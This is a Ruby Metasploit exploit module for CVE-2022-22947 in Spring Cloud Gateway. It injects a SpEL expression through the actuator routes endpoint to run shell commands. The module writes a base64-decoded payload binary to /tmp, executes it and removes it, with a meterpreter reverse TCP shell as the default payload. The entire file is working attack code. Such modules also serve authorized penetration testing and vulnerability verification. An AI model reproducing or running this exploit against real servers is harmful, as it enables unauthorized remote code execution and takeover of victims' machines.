##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Spring Cloud Gateway Remote Code Execution',
        'Description' => %q{
          This module exploits a Remote Code Execution vulnerability in Spring Cloud Gateway versions = 3.1.0 and 3.0.0 to 3.0.6.
          The vulnerability can be exploited when the Gateway Actuator endpoint is enabled, exposed and unsecured.
          An attacker can use SpEL expressions to execute code and take control of the victim machine. This module only supports Linux Droppers.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Ayan Saha'
        ],
        'References' => [
          ['CVE', '2022-22947' ],
          ['URL', 'https://github.com/crowsec-edtech/CVE-2022-22947'],
          ['URL', 'https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/']
        ],
        'Platform' => 'linux',
        'Arch' => [ARCH_X64],
        'Targets' => [

          [
            'Linux (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
              'Type' => :linux_dropper
            }
          ],
        ],
        'DisclosureDate' => '2022-03-03',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )
  end

  ## Takes in the command and creates a new route with it on the server
  def run_command(cmd)
    route_name = Rex::Text.rand_text_alpha(8).downcase
    uri = "/actuator/gateway/routes/#{route_name}"

    data = '{"id": "' + route_name + '", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\", \"' + cmd + '\"}).getInputStream()))}"}}], "uri": "http://example.com"}'

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri),
      'ctype' => 'application/json',
      'data' => data
    })

    if res && res.code == 201 && res.message == 'Created'
      return route_name
    else
      return false
    end
  end

  ## Cleaning up the routes created
  def cleanup_route(route_name)
    uri = "/actuator/gateway/routes/#{route_name}"
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(uri),
      'ctype' => 'application/json'
    })

    if res && res.code == 200
      print_good('Route deleted')
      return true
    else
      print_error("Couldn't delete route. Might require manual cleanup.")
      return false
    end
  end

  def check
    print_status('Checking if server vulnerable')
    res = run_command('whoami')

    if res
      cleanup_route(res)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  ## Refresh the gateway to trigerr the routes with commands created
  def refresh
    print_status('Trigerring reverse shell')
    uri = '/actuator/gateway/refresh'

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri),
      'ctype' => 'application/json'
    })
  end

  def exploit
    file_name = "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"

    cmd = "echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name} ; rm -f #{file_name}"

    res = run_command(cmd)

    if res
      print_good('Created route successfully with the reverse shell')
      refresh
      cleanup_route(res)
      print_good('Enjoy your Shell')
    else
      print_error('Unknown Error')
    end
  end

end
